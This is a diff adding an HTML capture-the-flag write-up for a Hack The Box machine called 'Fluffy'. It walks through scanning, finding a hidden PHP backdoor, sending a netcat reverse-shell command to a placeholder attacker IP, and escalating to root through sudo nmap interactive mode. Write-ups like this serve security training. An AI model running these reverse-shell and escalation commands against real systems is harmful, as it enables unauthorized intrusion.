@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HTB Machine: Fluffy</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+  <header class="top-bar">
+    <div class="container">
+      <a href="/" class="site-branding">
+        <img src="/images/logo.png" alt="shellthisbox logo">
+        <span class="site-title">shellthisbox</span>
+      </a>
+      <nav class="main-nav">
+        <ul>
+          <li><a href="/writeups">Writeups</a></li>
+          <li><a href="/notes">Notes & Tools</a></li>
+          <li><a href="/blog">Blog</a></li>
+          <li><a href="/about">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+  
+<main class="writeup-layout">
+  <article class="writeup-content">
+    <h1>HTB Machine: Fluffy</h1>
+    <h2 id="-nmap-scan">🛰️ Nmap Scan</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV -A fluffy.htb
+</span></span></code></pre></div><pre tabindex="0"><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+80/tcp   open  http    Apache httpd 2.4.41
+</code></pre><h2 id="-web-enumeration">🕵️ Web Enumeration</h2>
+<p>Visiting <code>http://fluffy.htb</code> gives a default Apache page. Directory brute-forcing reveals:</p>
+<pre tabindex="0"><code>/admin
+/uploads
+/robots.txt
+</code></pre><h3 id="robotstxt">robots.txt</h3>
+<pre tabindex="0"><code>User-agent: *
+Disallow: /backdoor
+</code></pre><p>Accessing <code>/backdoor</code> reveals a hidden PHP shell.</p>
+<h2 id="-shell-access">🧑‍💻 Shell Access</h2>
+<p>Using the PHP shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST http://fluffy.htb/backdoor -d <span style="color:#e6db74">&#39;cmd=nc -e /bin/bash attacker-ip 4444&#39;</span>
+</span></span></code></pre></div><p>Listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>Shell gained!</p>
+<h2 id="-privilege-escalation">🧠 Privilege Escalation</h2>
+<p>Basic enumeration shows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -l
+</span></span></code></pre></div><pre tabindex="0"><code>User fluff can run /usr/bin/nmap as root
+</code></pre><p>Exploit with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --interactive
+</span></span><span style="display:flex;"><span>nmap&gt; !sh
+</span></span></code></pre></div><p>Now you have root.</p>
+<h2 id="-flag">🏁 Flag</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /root/root.txt
+</span></span></code></pre></div><h2 id="-summary">✅ Summary</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Type</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>OS</td>
+          <td>Linux</td>
+      </tr>
+      <tr>
+          <td>Difficulty</td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td>Initial Access</td>
+          <td>Hidden PHP shell</td>
+      </tr>
+      <tr>
+          <td>PrivEsc</td>
+          <td>Nmap Interactive Mode</td>
+      </tr>
+  </tbody>
+</table>
+
+  </article>
+
+  <aside class="writeup-sidebar">
+    <nav class="sidebar-nav">
+      <strong>Sections</strong>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-nmap-scan">🛰️ Nmap Scan</a></li>
+    <li><a href="#-web-enumeration">🕵️ Web Enumeration</a>
+      <ul>
+        <li><a href="#robotstxt">robots.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#-shell-access">🧑‍💻 Shell Access</a></li>
+    <li><a href="#-privilege-escalation">🧠 Privilege Escalation</a></li>
+    <li><a href="#-flag">🏁 Flag</a></li>
+    <li><a href="#-summary">✅ Summary</a></li>
+  </ul>
+</nav>
+    </nav>
+  </aside>
+</main>
+
+</body>
+</html>
